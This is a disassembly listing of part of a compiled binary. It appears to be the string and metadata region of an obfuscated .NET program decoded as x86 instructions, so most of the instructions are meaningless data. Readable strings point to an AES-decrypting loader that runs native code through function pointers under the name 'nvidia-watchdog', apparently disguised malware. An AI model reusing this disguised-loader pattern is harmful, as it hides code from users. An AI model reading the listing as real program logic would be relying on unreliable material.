  40954a:	35 47 00 48 32       	xor    $0x32480047,%eax
  40954f:	65 55                	gs push %rbp
  409551:	54                   	push   %rsp
  409552:	31 4f 30             	xor    %ecx,0x30(%rdi)
  409555:	62                   	(bad)
  409556:	30 4f 5a             	xor    %cl,0x5a(%rdi)
  409559:	46                   	rex.RX
  40955a:	4e                   	rex.WRX
  40955b:	65 55                	gs push %rbp
  40955d:	79 59                	jns    0x4095b8
  40955f:	00 6c 62 69          	add    %ch,0x69(%rdx,%riz,2)
  409563:	37                   	(bad)
  409564:	54                   	push   %rsp
  409565:	6a 5a                	push   $0x5a
  409567:	69 69 77 5a 39 43 67 	imul   $0x6743395a,0x77(%rcx),%ebp
  40956e:	41                   	rex.B
  40956f:	45 70 36             	rex.RB jo 0x4095a8
  409572:	00 49 48             	add    %cl,0x48(%rcx)
  409575:	6e                   	outsb  (%rsi),(%dx)
  409576:	6a 56                	push   $0x56
  409578:	6b 64 53 34 63       	imul   $0x63,0x34(%rbx,%rdx,2),%esp
  40957d:	77 51                	ja     0x4095d0
  40957f:	62 31 6c 6f 6d       	(bad)
  409584:	51                   	push   %rcx
  409585:	00 62 6b             	add    %ah,0x6b(%rdx)
  409588:	79 78                	jns    0x409602
  40958a:	49                   	rex.WB
  40958b:	67 45                	addr32 rex.RB
  40958d:	4f 71 00             	rex.WRXB jno 0x409590
  409590:	54                   	push   %rsp
  409591:	6f                   	outsl  (%rsi),(%dx)
  409592:	42 61                	rex.X (bad)
  409594:	73 65                	jae    0x4095fb
  409596:	36 34 53             	ss xor $0x53,%al
  409599:	74 72                	je     0x40960d
  40959b:	69 6e 67 00 63 6c 61 	imul   $0x616c6300,0x67(%rsi),%ebp
  4095a2:	73 73                	jae    0x409617
  4095a4:	74 68                	je     0x40960e
  4095a6:	69 73 00 63 6f 6d 70 	imul   $0x706d6f63,0x0(%rbx),%esi
  4095ad:	00 69 6e             	add    %ch,0x6e(%rcx)
  4095b0:	66 6f                	outsw  (%rsi),(%dx)
  4095b2:	00 66 6c             	add    %ah,0x6c(%rsi)
  4095b5:	61                   	(bad)
  4095b6:	67 73 00             	addr32 jae 0x4095b9
  4095b9:	6e                   	outsb  (%rsi),(%dx)
  4095ba:	61                   	(bad)
  4095bb:	74 69                	je     0x409626
  4095bd:	76 65                	jbe    0x409624
  4095bf:	45 6e                	rex.RB outsb (%rsi),(%dx)
  4095c1:	74 72                	je     0x409635
  4095c3:	79 00                	jns    0x4095c5
  4095c5:	6e                   	outsb  (%rsi),(%dx)
  4095c6:	61                   	(bad)
  4095c7:	74 69                	je     0x409632
  4095c9:	76 65                	jbe    0x409630
  4095cb:	53                   	push   %rbx
  4095cc:	69 7a 65 4f 66 43 6f 	imul   $0x6f43664f,0x65(%rdx),%edi
  4095d3:	64 65 00 41 57       	fs add %al,%gs:0x57(%rcx)
  4095d8:	64 7a 58             	fs jp  0x409633
  4095db:	68 44 65 55 00       	push   $0x556544
  4095e0:	53                   	push   %rbx
  4095e1:	71 61                	jno    0x409644
  4095e3:	4a                   	rex.WX
  4095e4:	4e 6b 43 34 4b       	rex.WRX imul $0x4b,0x34(%rbx),%r8
  4095e9:	69 00 76 61 6c 75    	imul   $0x756c6176,(%rax),%eax
  4095ef:	65 5f                	gs pop %rdi
  4095f1:	5f                   	pop    %rdi
  4095f2:	00 54 74 52          	add    %dl,0x52(%rsp,%rsi,2)
  4095f6:	4a                   	rex.WX
  4095f7:	4a 62 44 58 37 33    	(bad)
  4095fd:	00 49 55             	add    %cl,0x55(%rcx)
  409600:	57                   	push   %rdi
  409601:	33 70 45             	xor    0x45(%rax),%esi
  409604:	4f 7a 42             	rex.WRXB jp 0x409649
  409607:	75 55                	jne    0x40965e
  409609:	6f                   	outsl  (%rsi),(%dx)
  40960a:	77 00                	ja     0x40960c
  40960c:	24 24                	and    $0x24,%al
  40960e:	6d                   	insl   (%dx),(%rdi)
  40960f:	65 74 68             	gs je  0x40967a
  409612:	6f                   	outsl  (%rsi),(%dx)
  409613:	64 30 78 36          	xor    %bh,%fs:0x36(%rax)
  409617:	30 30                	xor    %dh,(%rax)
  409619:	30 30                	xor    %dh,(%rax)
  40961b:	30 37                	xor    %dh,(%rdi)
  40961d:	2d 31 00 24 24       	sub    $0x24240031,%eax
  409622:	6d                   	insl   (%dx),(%rdi)
  409623:	65 74 68             	gs je  0x40968e
  409626:	6f                   	outsl  (%rsi),(%dx)
  409627:	64 30 78 36          	xor    %bh,%fs:0x36(%rax)
  40962b:	30 30                	xor    %dh,(%rax)
  40962d:	30 30                	xor    %dh,(%rax)
  40962f:	32 30                	xor    (%rax),%dh
  409631:	2d 31 00 24 24       	sub    $0x24240031,%eax
  409636:	6d                   	insl   (%dx),(%rdi)
  409637:	65 74 68             	gs je  0x4096a2
  40963a:	6f                   	outsl  (%rsi),(%dx)
  40963b:	64 30 78 36          	xor    %bh,%fs:0x36(%rax)
  40963f:	30 30                	xor    %dh,(%rax)
  409641:	30 30                	xor    %dh,(%rax)
  409643:	32 30                	xor    (%rax),%dh
  409645:	2d 32 00 24 24       	sub    $0x24240032,%eax
  40964a:	6d                   	insl   (%dx),(%rdi)
  40964b:	65 74 68             	gs je  0x4096b6
  40964e:	6f                   	outsl  (%rsi),(%dx)
  40964f:	64 30 78 36          	xor    %bh,%fs:0x36(%rax)
  409653:	30 30                	xor    %dh,(%rax)
  409655:	30 30                	xor    %dh,(%rax)
  409657:	32 61 2d             	xor    0x2d(%rcx),%ah
  40965a:	31 00                	xor    %eax,(%rax)
  40965c:	24 24                	and    $0x24,%al
  40965e:	6d                   	insl   (%dx),(%rdi)
  40965f:	65 74 68             	gs je  0x4096ca
  409662:	6f                   	outsl  (%rsi),(%dx)
  409663:	64 30 78 36          	xor    %bh,%fs:0x36(%rax)
  409667:	30 30                	xor    %dh,(%rax)
  409669:	30 30                	xor    %dh,(%rax)
  40966b:	32 61 2d             	xor    0x2d(%rcx),%ah
  40966e:	32 00                	xor    (%rax),%al
  409670:	24 24                	and    $0x24,%al
  409672:	6d                   	insl   (%dx),(%rdi)
  409673:	65 74 68             	gs je  0x4096de
  409676:	6f                   	outsl  (%rsi),(%dx)
  409677:	64 30 78 36          	xor    %bh,%fs:0x36(%rax)
  40967b:	30 30                	xor    %dh,(%rax)
  40967d:	30 30                	xor    %dh,(%rax)
  40967f:	33 39                	xor    (%rcx),%edi
  409681:	2d 31 00 24 24       	sub    $0x24240031,%eax
  409686:	6d                   	insl   (%dx),(%rdi)
  409687:	65 74 68             	gs je  0x4096f2
  40968a:	6f                   	outsl  (%rsi),(%dx)
  40968b:	64 30 78 36          	xor    %bh,%fs:0x36(%rax)
  40968f:	30 30                	xor    %dh,(%rax)
  409691:	30 30                	xor    %dh,(%rax)
  409693:	35 66 2d 31 00       	xor    $0x312d66,%eax
  409698:	24 24                	and    $0x24,%al
  40969a:	6d                   	insl   (%dx),(%rdi)
  40969b:	65 74 68             	gs je  0x409706
  40969e:	6f                   	outsl  (%rsi),(%dx)
  40969f:	64 30 78 36          	xor    %bh,%fs:0x36(%rax)
  4096a3:	30 30                	xor    %dh,(%rax)
  4096a5:	30 32                	xor    %dh,(%rdx)
  4096a7:	37                   	(bad)
  4096a8:	62 2d 31 00 46       	(bad)
  4096ad:	76 45                	jbe    0x4096f4
  4096af:	74 41                	je     0x4096f2
  4096b1:	65 6b 33 6b          	imul   $0x6b,%gs:(%rbx),%esi
  4096b5:	70 34                	jo     0x4096eb
  4096b7:	38 76 32             	cmp    %dh,0x32(%rsi)
  4096ba:	6c                   	insb   (%dx),(%rdi)
  4096bb:	4a 58                	rex.WX pop %rax
  4096bd:	56                   	push   %rsi
  4096be:	2e 39 53 30          	cs cmp %edx,0x30(%rbx)
  4096c2:	33 50 6c             	xor    0x6c(%rax),%edx
  4096c5:	39 38                	cmp    %edi,(%rax)
  4096c7:	76 31                	jbe    0x4096fa
  4096c9:	4a 37                	rex.WX (bad)
  4096cb:	4d 73 56             	rex.WRB jae 0x409724
  4096ce:	32 39                	xor    (%rcx),%bh
  4096d0:	65 00 6e 76          	add    %ch,%gs:0x76(%rsi)
  4096d4:	69 64 69 61 2d 77 61 	imul   $0x7461772d,0x61(%rcx,%rbp,2),%esp
  4096db:	74 
  4096dc:	63 68 64             	movsxd 0x64(%rax),%ebp
  4096df:	6f                   	outsl  (%rsi),(%dx)
  4096e0:	67 2e 67 2e 72 65    	addr32 cs addr32 jb,pn 0x40974b
  4096e6:	73 6f                	jae    0x409757
  4096e8:	75 72                	jne    0x40975c
  4096ea:	63 65 73             	movsxd 0x73(%rbp),%esp
  4096ed:	00 61 52             	add    %ah,0x52(%rcx)
  4096f0:	33 6e 62             	xor    0x62(%rsi),%ebp
  4096f3:	66 38 64 51 70       	data16 cmp %ah,0x70(%rcx,%rdx,2)
  4096f8:	32 66 65             	xor    0x65(%rsi),%ah
  4096fb:	4c 6d                	rex.WR insl (%dx),(%rdi)
  4096fd:	6b 33 31             	imul   $0x31,(%rbx),%esi
  409700:	2e 6c                	cs insb (%dx),(%rdi)
  409702:	53                   	push   %rbx
  409703:	66 67 41 70 61       	data16 addr32 rex.B jo 0x409769
  409708:	74 6b                	je     0x409775
  40970a:	64 78 73             	fs js  0x409780
  40970d:	56                   	push   %rsi
  40970e:	63 47 63             	movsxd 0x63(%rdi),%eax
  409711:	72 6b                	jb     0x40977e
  409713:	74 6f                	je     0x409784
  409715:	46                   	rex.RX
  409716:	64 2e 72 65          	fs jb,pn 0x40977f
  40971a:	73 6f                	jae    0x40978b
  40971c:	75 72                	jne    0x409790
  40971e:	63 65 73             	movsxd 0x73(%rbp),%esp
  409721:	00 55 6e             	add    %dl,0x6e(%rbp)
  409724:	6d                   	insl   (%dx),(%rdi)
  409725:	61                   	(bad)
  409726:	6e                   	outsb  (%rsi),(%dx)
  409727:	61                   	(bad)
  409728:	67 65 64 46 75 6e    	addr32 gs fs rex.RX jne 0x40979c
  40972e:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
  409732:	6e                   	outsb  (%rsi),(%dx)
  409733:	50                   	push   %rax
  409734:	6f                   	outsl  (%rsi),(%dx)
  409735:	69 6e 74 65 72 41 74 	imul   $0x74417265,0x74(%rsi),%ebp
  40973c:	74 72                	je     0x4097b0
  40973e:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
  409745:	61                   	(bad)
  409746:	6c                   	insb   (%dx),(%rdi)
  409747:	6c                   	insb   (%dx),(%rdi)
  409748:	69 6e 67 43 6f 6e 76 	imul   $0x766e6f43,0x67(%rsi),%ebp
  40974f:	65 6e                	outsb  %gs:(%rsi),(%dx)
  409751:	74 69                	je     0x4097bc
  409753:	6f                   	outsl  (%rsi),(%dx)
  409754:	6e                   	outsb  (%rsi),(%dx)
  409755:	00 46 6c             	add    %al,0x6c(%rsi)
  409758:	61                   	(bad)
  409759:	67 73 41             	addr32 jae 0x40979d
  40975c:	74 74                	je     0x4097d2
  40975e:	72 69                	jb     0x4097c9
  409760:	62 75 74 65 00       	(bad)
  409765:	43 6f                	rex.XB outsl (%rsi),(%dx)
  409767:	6d                   	insl   (%dx),(%rdi)
  409768:	70 69                	jo     0x4097d3
  40976a:	6c                   	insb   (%dx),(%rdi)
  40976b:	65 72 47             	gs jb  0x4097b5
  40976e:	65 6e                	outsb  %gs:(%rsi),(%dx)
  409770:	65 72 61             	gs jb  0x4097d4
  409773:	74 65                	je     0x4097da
  409775:	64 41 74 74          	fs rex.B je 0x4097ed
  409779:	72 69                	jb     0x4097e4
  40977b:	62 75 74 65 00       	(bad)
  409780:	00 01                	add    %al,(%rcx)
  409782:	00 80 9d 53 00 79    	add    %al,0x7900539d(%rax)
  409788:	00 73 00             	add    %dh,0x0(%rbx)
  40978b:	74 00                	je     0x40978d
  40978d:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
  409791:	2e 00 43 00          	cs add %al,0x0(%rbx)
  409795:	6f                   	outsl  (%rsi),(%dx)
  409796:	00 72 00             	add    %dh,0x0(%rdx)
  409799:	65 00 2c 00          	add    %ch,%gs:(%rax,%rax,1)
  40979d:	20 00                	and    %al,(%rax)
  40979f:	56                   	push   %rsi
  4097a0:	00 65 00             	add    %ah,0x0(%rbp)
  4097a3:	72 00                	jb     0x4097a5
  4097a5:	73 00                	jae    0x4097a7
  4097a7:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
  4097ad:	3d 00 33 00 2e       	cmp    $0x2e003300,%eax
  4097b2:	00 35 00 2e 00 30    	add    %dh,0x30002e00(%rip)        # 0x3040c5b8
  4097b8:	00 2e                	add    %ch,(%rsi)
  4097ba:	00 30                	add    %dh,(%rax)
  4097bc:	00 2c 00             	add    %ch,(%rax,%rax,1)
  4097bf:	20 00                	and    %al,(%rax)
  4097c1:	43 00 75 00          	rex.XB add %sil,0x0(%r13)
  4097c5:	6c                   	insb   (%dx),(%rdi)
  4097c6:	00 74 00 75          	add    %dh,0x75(%rax,%rax,1)
  4097ca:	00 72 00             	add    %dh,0x0(%rdx)
  4097cd:	65 00 3d 00 6e 00 65 	add    %bh,%gs:0x65006e00(%rip)        # 0x654105d4
  4097d4:	00 75 00             	add    %dh,0x0(%rbp)
  4097d7:	74 00                	je     0x4097d9
  4097d9:	72 00                	jb     0x4097db
  4097db:	61                   	(bad)
  4097dc:	00 6c 00 2c          	add    %ch,0x2c(%rax,%rax,1)
  4097e0:	00 20                	add    %ah,(%rax)
  4097e2:	00 50 00             	add    %dl,0x0(%rax)
  4097e5:	75 00                	jne    0x4097e7
  4097e7:	62                   	(bad)
  4097e8:	00 6c 00 69          	add    %ch,0x69(%rax,%rax,1)
  4097ec:	00 63 00             	add    %ah,0x0(%rbx)
  4097ef:	4b 00 65 00          	rex.WXB add %spl,0x0(%r13)
  4097f3:	79 00                	jns    0x4097f5
  4097f5:	54                   	push   %rsp
  4097f6:	00 6f 00             	add    %ch,0x0(%rdi)
  4097f9:	6b 00 65             	imul   $0x65,(%rax),%eax
  4097fc:	00 6e 00             	add    %ch,0x0(%rsi)
  4097ff:	3d 00 62 00 37       	cmp    $0x37006200,%eax
  409804:	00 37                	add    %dh,(%rdi)
  409806:	00 61 00             	add    %ah,0x0(%rcx)
  409809:	35 00 63 00 35       	xor    $0x35006300,%eax
  40980e:	00 36                	add    %dh,(%rsi)
  409810:	00 31                	add    %dh,(%rcx)
  409812:	00 39                	add    %bh,(%rcx)
  409814:	00 33                	add    %dh,(%rbx)
  409816:	00 34 00             	add    %dh,(%rax,%rax,1)
  409819:	65 00 30             	add    %dh,%gs:(%rax)
  40981c:	00 38                	add    %bh,(%rax)
  40981e:	00 39                	add    %bh,(%rcx)
  409820:	00 00                	add    %al,(%rax)
  409822:	6b 53 00 79          	imul   $0x79,0x0(%rbx),%edx
  409826:	00 73 00             	add    %dh,0x0(%rbx)
  409829:	74 00                	je     0x40982b
  40982b:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
  40982f:	2e 00 53 00          	cs add %dl,0x0(%rbx)
  409833:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
  409837:	75 00                	jne    0x409839
  409839:	72 00                	jb     0x40983b
  40983b:	69 00 74 00 79 00    	imul   $0x790074,(%rax),%eax
  409841:	2e 00 43 00          	cs add %al,0x0(%rbx)
  409845:	72 00                	jb     0x409847
  409847:	79 00                	jns    0x409849
  409849:	70 00                	jo     0x40984b
  40984b:	74 00                	je     0x40984d
  40984d:	6f                   	outsl  (%rsi),(%dx)
  40984e:	00 67 00             	add    %ah,0x0(%rdi)
  409851:	72 00                	jb     0x409853
  409853:	61                   	(bad)
  409854:	00 70 00             	add    %dh,0x0(%rax)
  409857:	68 00 79 00 2e       	push   $0x2e007900
  40985c:	00 41 00             	add    %al,0x0(%rcx)
  40985f:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
  409863:	43 00 72 00          	rex.XB add %sil,0x0(%r10)
  409867:	79 00                	jns    0x409869
  409869:	70 00                	jo     0x40986b
  40986b:	74 00                	je     0x40986d
  40986d:	6f                   	outsl  (%rsi),(%dx)
  40986e:	00 53 00             	add    %dl,0x0(%rbx)
  409871:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
  409875:	76 00                	jbe    0x409877
  409877:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
  40987d:	50                   	push   %rax
  40987e:	00 72 00             	add    %dh,0x0(%rdx)
  409881:	6f                   	outsl  (%rsi),(%dx)
  409882:	00 76 00             	add    %dh,0x0(%rsi)
  409885:	69 00 64 00 65 00    	imul   $0x650064,(%rax),%eax
  40988b:	72 00                	jb     0x40988d
  40988d:	00 33                	add    %dh,(%rbx)
  40988f:	7b 00                	jnp    0x409891
  409891:	31 00                	xor    %eax,(%rax)
  409893:	31 00                	xor    %eax,(%rax)
  409895:	31 00                	xor    %eax,(%rax)
  409897:	31 00                	xor    %eax,(%rax)
  409899:	31 00                	xor    %eax,(%rax)
  40989b:	2d 00 32 00 32       	sub    $0x32003200,%eax
  4098a0:	00 32                	add    %dh,(%rdx)
  4098a2:	00 32                	add    %dh,(%rdx)
  4098a4:	00 32                	add    %dh,(%rdx)
  4098a6:	00 2d 00 31 00 30    	add    %ch,0x30003100(%rip)        # 0x3040c9ac
  4098ac:	00 30                	add    %dh,(%rax)
  4098ae:	00 30                	add    %dh,(%rax)
  4098b0:	00 39                	add    %bh,(%rcx)
  4098b2:	00 2d 00 31 00 31    	add    %ch,0x31003100(%rip)        # 0x3140c9b8
  4098b8:	00 31                	add    %dh,(%rcx)
  4098ba:	00 31                	add    %dh,(%rcx)
  4098bc:	00 32                	add    %dh,(%rdx)
  4098be:	00 7d 00             	add    %bh,0x0(%rbp)
  4098c1:	00 4b 46             	add    %cl,0x46(%rbx)
  4098c4:	00 76 00             	add    %dh,0x0(%rsi)
  4098c7:	45 00 74 00 41       	add    %r14b,0x41(%r8,%rax,1)
  4098cc:	00 65 00             	add    %ah,0x0(%rbp)
  4098cf:	6b 00 33             	imul   $0x33,(%rax),%eax
  4098d2:	00 6b 00             	add    %ch,0x0(%rbx)
  4098d5:	70 00                	jo     0x4098d7
  4098d7:	34 00                	xor    $0x0,%al
  4098d9:	38 00                	cmp    %al,(%rax)
  4098db:	76 00                	jbe    0x4098dd
  4098dd:	32 00                	xor    (%rax),%al
  4098df:	6c                   	insb   (%dx),(%rdi)
  4098e0:	00 4a 00             	add    %cl,0x0(%rdx)
  4098e3:	58                   	pop    %rax
  4098e4:	00 56 00             	add    %dl,0x0(%rsi)
  4098e7:	2e 00 39             	cs add %bh,(%rcx)
  4098ea:	00 53 00             	add    %dl,0x0(%rbx)
  4098ed:	30 00                	xor    %al,(%rax)
  4098ef:	33 00                	xor    (%rax),%eax
  4098f1:	50                   	push   %rax
  4098f2:	00 6c 00 39          	add    %ch,0x39(%rax,%rax,1)
  4098f6:	00 38                	add    %bh,(%rax)
  4098f8:	00 76 00             	add    %dh,0x0(%rsi)
  4098fb:	31 00                	xor    %eax,(%rax)
  4098fd:	4a 00 37             	rex.WX add %sil,(%rdi)
  409900:	00 4d 00             	add    %cl,0x0(%rbp)
  409903:	73 00                	jae    0x409905
  409905:	56                   	push   %rsi
  409906:	00 32                	add    %dh,(%rdx)
  409908:	00 39                	add    %bh,(%rcx)
  40990a:	00 65 00             	add    %ah,0x0(%rbp)
  40990d:	00 33                	add    %dh,(%rbx)
  40990f:	7b 00                	jnp    0x409911
  409911:	31 00                	xor    %eax,(%rax)
  409913:	31 00                	xor    %eax,(%rax)
  409915:	31 00                	xor    %eax,(%rax)
  409917:	31 00                	xor    %eax,(%rax)
  409919:	31 00                	xor    %eax,(%rax)
  40991b:	2d 00 32 00 32       	sub    $0x32003200,%eax
  409920:	00 32                	add    %dh,(%rdx)
  409922:	00 32                	add    %dh,(%rdx)
  409924:	00 32                	add    %dh,(%rdx)
  409926:	00 2d 00 35 00 30    	add    %ch,0x30003500(%rip)        # 0x3040ce2c
  40992c:	00 30                	add    %dh,(%rax)
  40992e:	00 30                	add    %dh,(%rax)
  409930:	00 31                	add    %dh,(%rcx)
  409932:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040c938
  409938:	00 30                	add    %dh,(%rax)
  40993a:	00 30                	add    %dh,(%rax)
  40993c:	00 30                	add    %dh,(%rax)
  40993e:	00 7d 00             	add    %bh,0x0(%rbp)
  409941:	00 3b                	add    %bh,(%rbx)
  409943:	47 00 65 00          	rex.RXB add %r12b,0x0(%r13)
  409947:	74 00                	je     0x409949
  409949:	44 00 65 00          	add    %r12b,0x0(%rbp)
  40994d:	6c                   	insb   (%dx),(%rdi)
  40994e:	00 65 00             	add    %ah,0x0(%rbp)
  409951:	67 00 61 00          	add    %ah,0x0(%ecx)
  409955:	74 00                	je     0x409957
  409957:	65 00 46 00          	add    %al,%gs:0x0(%rsi)
  40995b:	6f                   	outsl  (%rsi),(%dx)
  40995c:	00 72 00             	add    %dh,0x0(%rdx)
  40995f:	46 00 75 00          	rex.RX add %r14b,0x0(%rbp)
  409963:	6e                   	outsb  (%rsi),(%dx)
  409964:	00 63 00             	add    %ah,0x0(%rbx)
  409967:	74 00                	je     0x409969
  409969:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
  40996f:	50                   	push   %rax
  409970:	00 6f 00             	add    %ch,0x0(%rdi)
  409973:	69 00 6e 00 74 00    	imul   $0x74006e,(%rax),%eax
  409979:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
  40997d:	00 11                	add    %dl,(%rcx)
  40997f:	66 00 69 00          	data16 add %ch,0x0(%rcx)
  409983:	6c                   	insb   (%dx),(%rdi)
  409984:	00 65 00             	add    %ah,0x0(%rbp)
  409987:	3a 00                	cmp    (%rax),%al
  409989:	2f                   	(bad)
  40998a:	00 2f                	add    %ch,(%rdi)
  40998c:	00 2f                	add    %ch,(%rdi)
  40998e:	00 00                	add    %al,(%rax)
  409990:	11 4c 00 6f          	adc    %ecx,0x6f(%rax,%rax,1)
  409994:	00 63 00             	add    %ah,0x0(%rbx)
  409997:	61                   	(bad)
  409998:	00 74 00 69          	add    %dh,0x69(%rax,%rax,1)
  40999c:	00 6f 00             	add    %ch,0x0(%rdi)
  40999f:	6e                   	outsb  (%rsi),(%dx)
  4099a0:	00 00                	add    %al,(%rax)
  4099a2:	33 7b 00             	xor    0x0(%rbx),%edi
  4099a5:	31 00                	xor    %eax,(%rax)
  4099a7:	31 00                	xor    %eax,(%rax)
  4099a9:	31 00                	xor    %eax,(%rax)
  4099ab:	31 00                	xor    %eax,(%rax)
  4099ad:	31 00                	xor    %eax,(%rax)
  4099af:	2d 00 32 00 32       	sub    $0x32003200,%eax
  4099b4:	00 32                	add    %dh,(%rdx)
  4099b6:	00 32                	add    %dh,(%rdx)
  4099b8:	00 32                	add    %dh,(%rdx)
  4099ba:	00 2d 00 32 00 30    	add    %ch,0x30003200(%rip)        # 0x3040cbc0
  4099c0:	00 30                	add    %dh,(%rax)
  4099c2:	00 30                	add    %dh,(%rax)
  4099c4:	00 31                	add    %dh,(%rcx)
  4099c6:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040c9cc
  4099cc:	00 30                	add    %dh,(%rax)
  4099ce:	00 30                	add    %dh,(%rax)
  4099d0:	00 31                	add    %dh,(%rcx)
  4099d2:	00 7d 00             	add    %bh,0x0(%rbp)
  4099d5:	00 33                	add    %dh,(%rbx)
  4099d7:	7b 00                	jnp    0x4099d9
  4099d9:	31 00                	xor    %eax,(%rax)
  4099db:	31 00                	xor    %eax,(%rax)
  4099dd:	31 00                	xor    %eax,(%rax)
  4099df:	31 00                	xor    %eax,(%rax)
  4099e1:	31 00                	xor    %eax,(%rax)
  4099e3:	2d 00 32 00 32       	sub    $0x32003200,%eax
  4099e8:	00 32                	add    %dh,(%rdx)
  4099ea:	00 32                	add    %dh,(%rdx)
  4099ec:	00 32                	add    %dh,(%rdx)
  4099ee:	00 2d 00 32 00 30    	add    %ch,0x30003200(%rip)        # 0x3040cbf4
  4099f4:	00 30                	add    %dh,(%rax)
  4099f6:	00 30                	add    %dh,(%rax)
  4099f8:	00 31                	add    %dh,(%rcx)
  4099fa:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040ca00
  409a00:	00 30                	add    %dh,(%rax)
  409a02:	00 30                	add    %dh,(%rax)
  409a04:	00 32                	add    %dh,(%rdx)
  409a06:	00 7d 00             	add    %bh,0x0(%rbp)
  409a09:	00 33                	add    %dh,(%rbx)
  409a0b:	7b 00                	jnp    0x409a0d
  409a0d:	31 00                	xor    %eax,(%rax)
  409a0f:	31 00                	xor    %eax,(%rax)
  409a11:	31 00                	xor    %eax,(%rax)
  409a13:	31 00                	xor    %eax,(%rax)
  409a15:	31 00                	xor    %eax,(%rax)
  409a17:	2d 00 32 00 32       	sub    $0x32003200,%eax
  409a1c:	00 32                	add    %dh,(%rdx)
  409a1e:	00 32                	add    %dh,(%rdx)
  409a20:	00 32                	add    %dh,(%rdx)
  409a22:	00 2d 00 33 00 30    	add    %ch,0x30003300(%rip)        # 0x3040cd28
  409a28:	00 30                	add    %dh,(%rax)
  409a2a:	00 30                	add    %dh,(%rax)
  409a2c:	00 31                	add    %dh,(%rcx)
  409a2e:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040ca34
  409a34:	00 30                	add    %dh,(%rax)
  409a36:	00 30                	add    %dh,(%rax)
  409a38:	00 31                	add    %dh,(%rcx)
  409a3a:	00 7d 00             	add    %bh,0x0(%rbp)
  409a3d:	00 33                	add    %dh,(%rbx)
  409a3f:	7b 00                	jnp    0x409a41
  409a41:	31 00                	xor    %eax,(%rax)
  409a43:	31 00                	xor    %eax,(%rax)
  409a45:	31 00                	xor    %eax,(%rax)
  409a47:	31 00                	xor    %eax,(%rax)
  409a49:	31 00                	xor    %eax,(%rax)
  409a4b:	2d 00 32 00 32       	sub    $0x32003200,%eax
  409a50:	00 32                	add    %dh,(%rdx)
  409a52:	00 32                	add    %dh,(%rdx)
  409a54:	00 32                	add    %dh,(%rdx)
  409a56:	00 2d 00 33 00 30    	add    %ch,0x30003300(%rip)        # 0x3040cd5c
  409a5c:	00 30                	add    %dh,(%rax)
  409a5e:	00 30                	add    %dh,(%rax)
  409a60:	00 31                	add    %dh,(%rcx)
  409a62:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040ca68
  409a68:	00 30                	add    %dh,(%rax)
  409a6a:	00 30                	add    %dh,(%rax)
  409a6c:	00 32                	add    %dh,(%rdx)
  409a6e:	00 7d 00             	add    %bh,0x0(%rbp)
  409a71:	00 33                	add    %dh,(%rbx)
  409a73:	7b 00                	jnp    0x409a75
  409a75:	31 00                	xor    %eax,(%rax)
  409a77:	31 00                	xor    %eax,(%rax)
  409a79:	31 00                	xor    %eax,(%rax)
  409a7b:	31 00                	xor    %eax,(%rax)
  409a7d:	31 00                	xor    %eax,(%rax)
  409a7f:	2d 00 32 00 32       	sub    $0x32003200,%eax
  409a84:	00 32                	add    %dh,(%rdx)
  409a86:	00 32                	add    %dh,(%rdx)
  409a88:	00 32                	add    %dh,(%rdx)
  409a8a:	00 2d 00 34 00 30    	add    %ch,0x30003400(%rip)        # 0x3040ce90
  409a90:	00 30                	add    %dh,(%rax)
  409a92:	00 30                	add    %dh,(%rax)
  409a94:	00 31                	add    %dh,(%rcx)
  409a96:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040ca9c
  409a9c:	00 30                	add    %dh,(%rax)
  409a9e:	00 30                	add    %dh,(%rax)
  409aa0:	00 31                	add    %dh,(%rcx)
  409aa2:	00 7d 00             	add    %bh,0x0(%rbp)
  409aa5:	00 33                	add    %dh,(%rbx)
  409aa7:	7b 00                	jnp    0x409aa9
  409aa9:	31 00                	xor    %eax,(%rax)
  409aab:	31 00                	xor    %eax,(%rax)
  409aad:	31 00                	xor    %eax,(%rax)
  409aaf:	31 00                	xor    %eax,(%rax)
  409ab1:	31 00                	xor    %eax,(%rax)
  409ab3:	2d 00 32 00 32       	sub    $0x32003200,%eax
  409ab8:	00 32                	add    %dh,(%rdx)
  409aba:	00 32                	add    %dh,(%rdx)
  409abc:	00 32                	add    %dh,(%rdx)
  409abe:	00 2d 00 34 00 30    	add    %ch,0x30003400(%rip)        # 0x3040cec4
  409ac4:	00 30                	add    %dh,(%rax)
  409ac6:	00 30                	add    %dh,(%rax)
  409ac8:	00 31                	add    %dh,(%rcx)
  409aca:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040cad0
  409ad0:	00 30                	add    %dh,(%rax)
  409ad2:	00 30                	add    %dh,(%rax)
  409ad4:	00 32                	add    %dh,(%rdx)
  409ad6:	00 7d 00             	add    %bh,0x0(%rbp)
  409ad9:	00 33                	add    %dh,(%rbx)
  409adb:	7b 00                	jnp    0x409add
  409add:	31 00                	xor    %eax,(%rax)
  409adf:	31 00                	xor    %eax,(%rax)
  409ae1:	31 00                	xor    %eax,(%rax)
  409ae3:	31 00                	xor    %eax,(%rax)
  409ae5:	31 00                	xor    %eax,(%rax)
  409ae7:	2d 00 32 00 32       	sub    $0x32003200,%eax
  409aec:	00 32                	add    %dh,(%rdx)
  409aee:	00 32                	add    %dh,(%rdx)
  409af0:	00 32                	add    %dh,(%rdx)
  409af2:	00 2d 00 35 00 30    	add    %ch,0x30003500(%rip)        # 0x3040cff8
  409af8:	00 30                	add    %dh,(%rax)
  409afa:	00 30                	add    %dh,(%rax)
  409afc:	00 31                	add    %dh,(%rcx)
  409afe:	00 2d 00 30 00 30    	add    %ch,0x30003000(%rip)        # 0x3040cb04
  409b04:	00 30                	add    %dh,(%rax)
  409b06:	00 30                	add    %dh,(%rax)
